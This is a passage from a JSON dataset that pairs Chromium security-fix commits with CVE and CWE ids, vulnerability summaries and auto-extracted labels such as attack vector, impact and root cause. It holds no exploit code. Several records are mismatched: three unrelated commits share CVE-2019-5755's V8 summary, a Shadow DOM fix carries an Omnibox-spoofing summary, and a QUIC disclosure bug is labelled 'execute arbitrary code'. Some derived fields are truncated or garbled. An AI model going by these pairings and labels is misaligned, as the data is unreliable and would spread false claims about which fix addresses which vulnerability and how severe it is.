https:\/\/chromium-review.googlesource.com\/c\/1417356\nAuto-Submit: Ryan Hamilton <rch@chromium.org>\nCommit-Queue: Zhongyi Shi <zhongyi@chromium.org>\nReviewed-by: Zhongyi Shi <zhongyi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#623763}","summary":"Implementation error in QUIC Networking in Google Chrome prior to 72.0.3626.81 allowed an attacker running or able to cause use of a proxy server to obtain cleartext of transport encryption via malicious network proxy.","commit_message_1":"fix a bug in <file> in which support for http url in quic proxy wa always set to false","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via malicious network proxy","Impact":"execute arbitrary code","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"032c3339bfb454c65ce38e7eafe49a54bac83073","cve_id":"CVE-2019-5757","cwe_id":"CWE-704","commit_message":"Fix SVG crash for v0 distribution into foreignObject.\n\nWe require a parent element to be an SVG element for non-svg-root\nelements in order to create a LayoutObject for them. However, we checked\nthe light tree parent element, not the flat tree one which is the parent\nfor the layout tree construction. Note that this is just an issue in\nShadow DOM v0 since v1 does not allow shadow roots on SVG elements.\n\nBug: 915469\nChange-Id: Id81843abad08814fae747b5bc81c09666583f130\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1382494\nReviewed-by: Fredrik S\u00f6derquist <fs@opera.com>\nCommit-Queue: Rune Lillesveen <futhark@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#617487}","summary":"An incorrect object type assumption in SVG in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to potentially exploit object corruption via a crafted HTML page.","commit_message_1":"fix svg crash for v0 distribution into foreignobject","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"via a crafted html page","Impact":"potentially exploit object corruption","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"419c4bfbfb94849ed30dcab7c3aaf67afe238b27","cve_id":"CVE-2019-5758","cwe_id":"CWE-416","commit_message":"Fix UAP in ImageBitmapLoader\/FileReaderLoader\n\nFileReaderLoader stores its client as a raw pointer, so in cases like\nImageBitmapLoader where the FileReaderLoaderClient really is garbage\ncollected we have to make sure to destroy the FileReaderLoader when\nthe ExecutionContext that owns it is destroyed.\n\nBug: 913970\nChange-Id: I40b02115367cf7bf5bbbbb8e9b57874d2510f861\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1374511\nReviewed-by: Jeremy Roman <jbroman@chromium.org>\nCommit-Queue: Marijn Kruisselbrink <mek@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#616342}","summary":"Incorrect object lifecycle management in Blink in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix uap in imagebitmaploader\/filereaderloader filereaderloader store it client a a raw pointer , so in case like imagebitmaploader where the filereaderloaderclient really is garbage collected we have to make sure to destroy the filereaderloader when the executioncontext that owns it is destroyed","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"5405341d5cc268a0b2ff0678bd78ddda0892e7ea","cve_id":"CVE-2019-5759","cwe_id":"CWE-416","commit_message":"Fix crashes in RenderFrameImpl::OnSelectPopupMenuItem(s)\n\nExternalPopupMenu::DidSelectItem(s) can delete the RenderFrameImpl.\nWe need to reset external_popup_menu_ before calling it.\n\nBug: 912211\nChange-Id: Ia9a628e144464a2ebb14ab77d3a693fd5cead6fc\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1381325\nCommit-Queue: Kent Tamura <tkent@chromium.org>\nReviewed-by: Avi Drissman <avi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#618026}","summary":"Incorrect lifetime handling in HTML select elements in Google Chrome on Android and Mac prior to 72.0.3626.81 allowed a remote attacker to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"externalpopupmenu : :didselectitem ( s ) can delete the renderframeimpl","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially perform a sandbox escape","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"3514a77e7fa2e5b8bfe5d98af22964bbd69d680f","cve_id":"CVE-2019-5760","cwe_id":"CWE-416","commit_message":"Check weak pointers in RTCPeerConnectionHandler::WebRtcSetDescriptionObserverImpl\n\nBug: 912074\nChange-Id: I8ba86751f5d5bf12db51520f985ef0d3dae63ed8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1411916\nCommit-Queue: Guido Urdaneta <guidou@chromium.org>\nReviewed-by: Henrik Bostr\u00f6m <hbos@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#622945}","summary":"Insufficient checks of pointer validity in WebRTC in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"check weak pointer in rtcpeerconnectionhandler : :webrtcsetdescriptionobserverimpl","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"f045c704568e9cf6279b3cbccbec6d86c35f8a13","cve_id":"CVE-2019-5755","cwe_id":"CWE-189","commit_message":"Disable FileSystemManager::CreateWriter if WritableFiles isn't enabled.\n\nBug: 922677\nChange-Id: Ib16137cbabb2ec07f1ffc0484722f1d9cc533404\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1416570\nCommit-Queue: Marijn Kruisselbrink <mek@chromium.org>\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#623552}","summary":"Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read\/write via a crafted HTML page.","commit_message_1":"disable filesystemmanager : :createwriter if writablefiles is n't enabled","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted html page","Impact":"perform arbitrary read \/ write","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"2706470a422dec8f4ae2538e80f0e7e3c4f4f7f6","cve_id":"CVE-2019-5755","cwe_id":"CWE-189","commit_message":"[Payment Request][Desktop] Prevent use after free.\n\nBefore this patch, a compromised renderer on desktop could make IPC\nmethods into Payment Request in an unexpected ordering and cause use\nafter free in the browser.\n\nThis patch will disconnect the IPC pipes if:\n - Init() is called more than once.\n - Any other method is called before Init().\n - Show() is called more than once.\n - Retry(), UpdateWith(), NoupdatedPaymentDetails(), Abort(), or\n   Complete() are called before Show().\n\nThis patch re-orders the IPC methods in payment_request.cc to match the\norder in payment_request.h, which eases verifying correctness of their\nerror handling.\n\nThis patch prints more errors to the developer console, if available, to\nimprove debuggability by web developers, who rarely check where LOG\nprints.\n\nAfter this patch, unexpected ordering of calls into the Payment Request\nIPC from the renderer to the browser on desktop will print an error in\nthe developer console and disconnect the IPC pipes. The binary might\nincrease slightly in size because more logs are included in the release\nversion instead of being stripped at compile time.\n\nBug: 912947\nChange-Id: Iac2131181c64cd49b4e5ec99f4b4a8ae5d8df57a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1370198\nReviewed-by: anthonyvd <anthonyvd@chromium.org>\nCommit-Queue: Rouslan Solomakhin <rouslan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#616822}","summary":"Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read\/write via a crafted HTML page.","commit_message_1":"[ desktop ] prevent use after free","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted html page","Impact":"perform arbitrary read \/ write","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"971548cdca2d4c0a6fedd3db0c94372c2a27eac3","cve_id":"CVE-2019-5755","cwe_id":"CWE-189","commit_message":"Make MediaStreamDispatcherHost per-request instead of per-frame.\n\nInstead of having RenderFrameHost own a single MSDH to handle all\nrequests from a frame, MSDH objects will be owned by a strong binding.\n\nA consequence of this is that an additional requester ID is added to\nrequests to MediaStreamManager, so that an MSDH is able to cancel only\nrequests generated by it.\n\nIn practice, MSDH will continue to be per frame in most cases since\neach frame normally makes a single request for an MSDH object.\n\nThis fixes a lifetime issue caused by the IO thread executing tasks\nafter the RenderFrameHost dies.\n\nDrive-by: Fix some minor lint issues.\n\nBug: 912520\nChange-Id: I52742ffc98b9fc57ce8e6f5093a61aed86d3e516\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1369799\nReviewed-by: Emircan Uysaler <emircan@chromium.org>\nReviewed-by: Ken Buchanan <kenrb@chromium.org>\nReviewed-by: Olga Sharonova <olka@chromium.org>\nCommit-Queue: Guido Urdaneta <guidou@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#616347}","summary":"Incorrect handling of negative zero in V8 in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform arbitrary read\/write via a crafted HTML page.","commit_message_1":"make mediastreamdispatcherhost per-request instead of per-frame","Vulnerability Type":"Numeric Errors","Attack Vector":"via a crafted html page","Impact":"perform arbitrary read \/ write","Root Cause":"caused by inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"7aaf7e9031ee16b9d4212fa0bc03d94713b3261b","cve_id":"CVE-2019-5768","cwe_id":"CWE-254","commit_message":"[DevTools] Guard DOM.setFileInputFiles under MayAffectLocalFiles\n\nBug: 805557\nChange-Id: Ib6f37ec6e1d091ee54621cc0c5c44f1a6beab10f\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1334847\nReviewed-by: Pavel Feldman <pfeldman@chromium.org>\nCommit-Queue: Dmitry Gozman <dgozman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#607902}","summary":"DevTools API not correctly gating on extension capability in DevTools in Google Chrome prior to 72.0.3626.81 allowed an attacker who convinced a user to install a malicious extension to read local files via a crafted Chrome Extension.","commit_message_1":"guard <file> under mayaffectlocalfiles","Vulnerability Type":"Security Features","Attack Vector":"via a crafted chrome extension","Impact":"install a malicious extension to read local files","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"8c7054864ea9b70015351b17376b8515296efb8f","cve_id":"CVE-2019-5769","cwe_id":"CWE-20","commit_message":"Fix crash in RunInfo::NumGraphemes\n\nFix crash in NumGraphemes when called with an invalid end char position.\n\nBug: 913975\nTest: fast\/text\/international\/ar_tab_selection_crash.html\nChange-Id: I93a94ba04e3e02b10ac8ef4186cf606b7df5c859\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1374630\nCommit-Queue: Koji Ishii <kojii@chromium.org>\nReviewed-by: Koji Ishii <kojii@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#616145}","summary":"Incorrect handling of invalid end character position when front rendering in Blink in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix crash in numgraphemes when called with an invalid end char position","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by insufficient validation of untrusted input","Attack Type":"remote attacker"},{"commit_id":"5f8761dd073c4ddd3b5aea8d95a2717e7b6e36e5","cve_id":"CVE-2019-5770","cwe_id":"CWE-125","commit_message":"Validate glClearBuffer*v function |buffer| param on the client side\n\nOtherwise we could read out-of-bounds even if an invalid |buffer| is passed\nin and in theory we should not read the buffer at all.\n\nBUG=908749\nTEST=gl_tests in ASAN build\nR=piman@chromium.org\n\nChange-Id: I94b69b56ce3358ff9bfc0e21f0618aec4371d1ec\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1354571\nReviewed-by: Antoine Labour <piman@chromium.org>\nCommit-Queue: Zhenyao Mo <zmo@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#612023}","summary":"Insufficient input validation in WebGL in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"validate glclearbuffer * v function |buffer| param on the client side otherwise we could read out-of-bounds even if an invalid |buffer| is passed in and in theory we should not read the buffer at all","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a bad cast","Attack Type":"remote attacker"},{"commit_id":"b32471d5abb3b3a4fe56e1dd79871400b51a0cca","cve_id":"CVE-2019-5774","cwe_id":"CWE-20","commit_message":"Add .desktop file to download_file_types.asciipb\n\n.desktop files act as shortcuts on Linux, allowing arbitrary code\nexecution. We should send pings for these files.\n\nBug: 904182\nChange-Id: Ibc26141fb180e843e1ffaf3f78717a9109d2fa9a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1344552\nReviewed-by: Varun Khaneja <vakh@chromium.org>\nCommit-Queue: Daniel Rubery <drubery@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#611272}","summary":"Omission of the .desktop filetype from the Safe Browsing checklist in SafeBrowsing in Google Chrome on Linux prior to 72.0.3626.81 allowed an attacker who convinced a user to download a .desktop file to execute arbitrary code via a downloaded .desktop file.","commit_message_1":"add","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a downloaded . desktop file","Impact":"download a . desktop file to execute arbitrary","Root Cause":"caused by insufficient validation of untrusted input","Attack Type":"remote attacker"},{"commit_id":"af38308b7112bdfbc0cfcc27f966314accc471d0","cve_id":"CVE-2019-5775","cwe_id":"CWE-20","commit_message":"Mapping several Indic characters to confusables.\n\nA number of characters from several Indian scripts are confusable,\nespecially with numbers. This change maps these characters to their\nASCII lookalike to allow fallback to punycode when displaying probable\nspoofing URLs.\n\nBug: 849421\nBug: 892646\nBug: 896722\nChange-Id: I6d463642f3541454dc39bf4b32b8291417697c52\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1295179\nReviewed-by: Tommy Li <tommycli@chromium.org>\nCommit-Queue: Joe DeBlasio <jdeblasio@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#602032}","summary":"Incorrect handling of a confusable character in Omnibox in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"mapping several indic character to confusables","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"4d666348de3f67d5cb7b5401f0f69f6b9d3719eb","cve_id":"CVE-2019-5776","cwe_id":"CWE-20","commit_message":"Include U+0517 in set of Cyrillic\/Latin lookalikes.\n\nCyrillic letter U+0517 (\u0517) looks somewhat similar to the Latin letter p.\nThis CL adds this character to the set of Cyrillic characters that look\nlike Latin characters. Domains made up entirely of Cyrillic\/Latin\nlookalikes are displayed as punycode in URLs.\n\nBug: 863663\nChange-Id: I4340c48d124c9c4cd3d3b5d0f9d3865d709e082d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1286825\nCommit-Queue: Joe DeBlasio <jdeblasio@chromium.org>\nCommit-Queue: Peter Kasting <pkasting@chromium.org>\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#600582}","summary":"Incorrect handling of a confusable character in Omnibox in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"include u+<number> in set of cyrillic\/latin lookalikes","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"2f01a0cb03732fdb982dd42786d95736322d2241","cve_id":"CVE-2018-20073","cwe_id":"CWE-200","commit_message":"Disable setxattr calls from quarantine subsystem on Chrome OS.\n\nBUG=733943\n\nChange-Id: I6e743469a8dc91536e180ecf4ff0df0cf427037c\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1380571\nCommit-Queue: Will Harris <wfh@chromium.org>\nReviewed-by: Raymes Khoury <raymes@chromium.org>\nReviewed-by: David Trainor <dtrainor@chromium.org>\nReviewed-by: Thiemo Nagel <tnagel@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#617961}","summary":"Use of extended attributes in downloads in Google Chrome prior to 72.0.3626.81 allowed a local attacker to read download URLs via the filesystem.","commit_message_1":"disable setxattr call from quarantine subsystem on chrome o","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via the filesystem","Impact":"read download urls","Root Cause":"caused by inappropriate implementation","Attack Type":"local attacker"},{"commit_id":"e13eb21898c7eba584f680e3d17ca1b9e28bc505","cve_id":"CVE-2019-5778","cwe_id":"CWE-79","commit_message":"[Extensions] Have URLPattern::Contains() properly check schemes\n\nHave URLPattern::Contains() properly check the schemes of the patterns\nwhen evaluating if one pattern contains another. This is important in\norder to prevent extensions from requesting chrome:-scheme permissions\nvia the permissions API when <all_urls> is specified as an optional\npermission.\n\nBug: 859600,918470\n\nChange-Id: If04d945ad0c939e84a80d83502c0f84b6ef0923d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1396561\nCommit-Queue: Devlin <rdevlin.cronin@chromium.org>\nReviewed-by: Karan Bhatia <karandeepb@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#621410}","summary":"A missing case for handling special schemes in permission request checks in Extensions in Google Chrome prior to 72.0.3626.81 allowed an attacker who convinced a user to install a malicious extension to bypass extension permission checks for privileged pages via a crafted Chrome Extension.","commit_message_1":"properly check scheme have urlpattern : :contains ( ) properly check the scheme of the pattern when evaluating if one pattern contains another","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted chrome extension","Impact":"bypass security restrictions","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"18c5c5dcef9cfccff64f0c23f920ef22822271a9","cve_id":"CVE-2019-5779","cwe_id":"CWE-264","commit_message":"service worker: Make navigate\/openWindow go through more security checks.\n\nWindowClient.navigate() and Clients.openWindow() were implemented in\na way that directly navigated to the URL without going through\nsome checks that the normal navigation path goes through. This CL\nattempts to fix that:\n- WindowClient.navigate() now goes through Navigator::RequestOpenURL()\n  instead of directly through WebContents::OpenURL().\n- Clients.openWindow() now calls more ContentBrowserClient functions\n  for manipulating the navigation before invoking\n  ContentBrowserClient::OpenURL().\n\nBug: 904219\nChange-Id: Ic38978aee98c09834fdbbc240164068faa3fd4f5\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1345686\nCommit-Queue: Matt Falkenhagen <falken@chromium.org>\nReviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>\nReviewed-by: Kinuko Yasuda <kinuko@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#610753}","summary":"Insufficient policy validation in ServiceWorker in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to bypass navigation restrictions via a crafted HTML page.","commit_message_1":"make navigate\/openwindow go through more security check","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted html page","Impact":"bypass navigation restrictions","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"0328261c41b1b7495e1d4d4cf958f41a08aff38b","cve_id":"CVE-2019-5780","cwe_id":"CWE-20","commit_message":"mac: Do not let synthetic events toggle \"Allow JavaScript From AppleEvents\"\n\nBug: 891697\nChange-Id: I49eb77963515637df739c9d2ce83530d4e21cf15\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1308771\nReviewed-by: Elly Fong-Jones <ellyjones@chromium.org>\nCommit-Queue: Robert Sesek <rsesek@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#604268}","summary":"Insufficient restrictions on what can be done with Apple Events in Google Chrome on macOS prior to 72.0.3626.81 allowed a local attacker to execute JavaScript via Apple Events.","commit_message_1":"do not let synthetic event toggle `` allow javascript from appleevents ''","Vulnerability Type":"Improper Input Validation","Attack Vector":"via apple events","Impact":"execute javascript","Root Cause":"caused by insufficient policy enforcement","Attack Type":"local attacker"},{"commit_id":"3509b4a360edec9f566ae5d3cb5fe16878845a70","cve_id":"CVE-2019-5781","cwe_id":"CWE-20","commit_message":"Make {First,Last}AssignedNode() be aware of Incremental Shadow DOM\n\nPrevent a possible wrong usage of {First,Last}AssignedNode().\n\nBug: 776656\nChange-Id: I5d84b062c92cd89e40e3c051ae08bcefea658d25\nReviewed-on: https:\/\/chromium-review.googlesource.com\/896725\nReviewed-by: Takayoshi Kochi <kochi@chromium.org>\nReviewed-by: Rune Lillesveen <futhark@chromium.org>\nCommit-Queue: Hayato Ito <hayato@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#533898}","summary":"Incorrect handling of a confusable character in Omnibox in Google Chrome prior to 72.0.3626.81 allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted domain name.","commit_message_1":"make { first , last } assignednode ( ) be aware of incremental shadow dom prevent a possible wrong usage of { first , last } assignednode ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by insufficient policy enforcement","Attack Type":"remote attacker"},{"commit_id":"ae5822065fc801142b4d0c312b2d718985a0bd97","cve_id":"CVE-2018-17479","cwe_id":"CWE-416","commit_message":"Harden gpu::SizedResult against overflow\n\nUse CheckedNumerics to prevent silent uint32_t overflow.\n\nBug: 905336, 905459\nChange-Id: Ie518def9063143ef2393be566419a209f68f0dce\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/1336083\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nReviewed-by: Abhishek Arya <inferno@chromium.org>\nCommit-Queue: Antoine Labour <piman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#608184}","summary":"Incorrect object lifetime calculations in GPU code in Google Chrome prior to 70.0.3538.110 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"against overflow use checkednumerics to prevent silent uint32_t overflow","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"98095c718d7580b5d6715e5bfd8698234ecb4470","cve_id":"CVE-2018-6154","cwe_id":"CWE-119","commit_message":"Validate all incoming WebGLObjects.\n\nA few entry points were missing the correct validation.\n\nTested with improved conformance tests in\nhttps:\/\/github.com\/KhronosGroup\/WebGL\/pull\/2654 .\n\nBug: 848914\nCq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel\nChange-Id: Ib98a61cc5bf378d1b3338b04acd7e1bc4c2fe008\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1086718\nReviewed-by: Kai Ninomiya <kainino@chromium.org>\nReviewed-by: Antoine Labour <piman@chromium.org>\nCommit-Queue: Kenneth Russell <kbr@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#565016}","summary":"Insufficient data validation in WebGL in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"validate all incoming webglobjects","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by improper bounds checking by WebGL","Attack Type":"remote attacker"},{"commit_id":"20b65d00ca3d8696430e22efad7485366f8c3a21","cve_id":"CVE-2018-6158","cwe_id":"CWE-362","commit_message":"[oilpan] Fix GCInfoTable for multiple threads\n\nPreviously, grow and access from different threads could lead to a race\non the table backing; see bug.\n\n- Rework the table to work on an existing reservation.\n- Commit upon growing, avoiding any copies.\n\nDrive-by: Fix over-allocation of table.\n\nBug: chromium:841280\nChange-Id: I329cb6f40091e14e8c05334ba1104a9440c31d43\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1061525\nCommit-Queue: Michael Lippautz <mlippautz@chromium.org>\nReviewed-by: Kentaro Hara <haraken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#560434}","summary":"A race condition in Oilpan in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix gcinfotable for multiple thread previously , grow and access from different thread could lead to a race on the table backing ; see bug","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"01b42e2bc2aac531b17596729ae4e5c223ae7124","cve_id":"CVE-2018-6159","cwe_id":"CWE-200","commit_message":"Fix timing allow check algorithm for service workers\n\nThis CL uses the OriginalURLViaServiceWorker() in the timing allow check\nalgorithm if the response WasFetchedViaServiceWorker(). This way, if a\nservice worker changes a same origin request to become cross origin,\nthen the timing allow check algorithm will still fail.\n\nresource-timing-worker.js is changed so it avoids an empty Response,\nwhich is an odd case in terms of same origin checks.\n\nBug: 837275\nChange-Id: I7e497a6fcc2ee14244121b915ca5f5cceded417a\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1038229\nCommit-Queue: Nicol\u00e1s Pe\u00f1a Moreno <npm@chromium.org>\nReviewed-by: Yoav Weiss <yoav@yoav.ws>\nReviewed-by: Timothy Dresser <tdresser@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#555476}","summary":"Insufficient policy enforcement in ServiceWorker in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted HTML page.","commit_message_1":"fix timing allow check algorithm for service worker this cl us the originalurlviaserviceworker ( ) in the timing allow check algorithm if the response wasfetchedviaserviceworker ( )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"761c75d2d607638ff53c764b4925bcca9be601d8","cve_id":"CVE-2018-6161","cwe_id":"CWE-20","commit_message":"Redirect should not circumvent same-origin restrictions\n\nCheck whether we have access to the audio data when the format is set.\nAt this point we have enough information to determine this. The old approach\nbased on when the src was changed was incorrect because at the point, we\nonly know the new src; none of the response headers have been read yet.\n\nThis new approach also removes the incorrect message reported in 619114.\n\nBug: 826552, 619114\nChange-Id: I95119b3a1e399c05d0fbd2da71f87967978efff6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1069540\nCommit-Queue: Raymond Toy <rtoy@chromium.org>\nReviewed-by: Yutaka Hirano <yhirano@chromium.org>\nReviewed-by: Hongchan Choi <hongchan@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#564313}","summary":"Insufficient policy enforcement in Blink in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to bypass same origin policy via a crafted HTML page.","commit_message_1":"redirect should not circumvent same-origin restriction check whether we have access to the audio data when the format is set","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass same origin policy","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"b43de74aa37a65c608308a122098204ab9c2702f","cve_id":"CVE-2018-6162","cwe_id":null,"commit_message":"fix incorrect TexImage3D params w\/ UNPACK_IMAGE_HEIGHT\n\nBug: 804123\nTest: http:\/\/github.com\/KhronosGroup\/WebGL\/pull\/2646\nCq-Include-Trybots: luci.chromium.try:android_optional_gpu_tests_rel;luci.chromium.try:linux_optional_gpu_tests_rel;luci.chromium.try:mac_optional_gpu_tests_rel;luci.chromium.try:win_optional_gpu_tests_rel\nChange-Id: Ifbce9b93f0b35817881e1e34930cbac22a1e8b98\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1053573\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCommit-Queue: Kai Ninomiya <kainino@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#558962}","summary":"Improper deserialization in WebGL in Google Chrome on Mac prior to 68.0.3440.75 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"fix incorrect teximage3d params w\/ unpack_image_height","Vulnerability Type":"improper deseria","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d616695bd68610e75b90d734d72d42534bf01b82","cve_id":"CVE-2018-6163","cwe_id":null,"commit_message":"Add confusability mapping entries for Myanmar and Georgian\n\nU+10D5 (\u10d5), U+1012 (\u1012) => 3\n\nBug: 847242, 849398\nTest: components_unittests --gtest_filter=*IDN*\nChange-Id: I9abb8560cf1c9e8e5e8d89980780b89461f7be52\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1091430\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Mustafa Emre Acer <meacer@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#565709}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"add confusability mapping entry for myanmar and georgian","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted domain name","Impact":"perform domain spoofing via idn homo","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"0c45ffd2a1b2b6b91aaaac989ad10a76765083c6","cve_id":"CVE-2018-6164","cwe_id":"CWE-200","commit_message":"Disallow access to opaque CSS responses.\n\nBug: 848786\nChange-Id: Ie53fbf644afdd76d7c65649a05c939c63d89b4ec\nReviewed-on: https:\/\/chromium-review.googlesource.com\/1088335\nReviewed-by: Kouhei Ueno <kouhei@chromium.org>\nCommit-Queue: Matt Falkenhagen <falken@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#565537}","summary":"Insufficient origin checks for CSS content in Blink in Google Chrome prior to 68.0.3440.75 allowed a remote attacker to leak cross-origin data via a crafted HTML 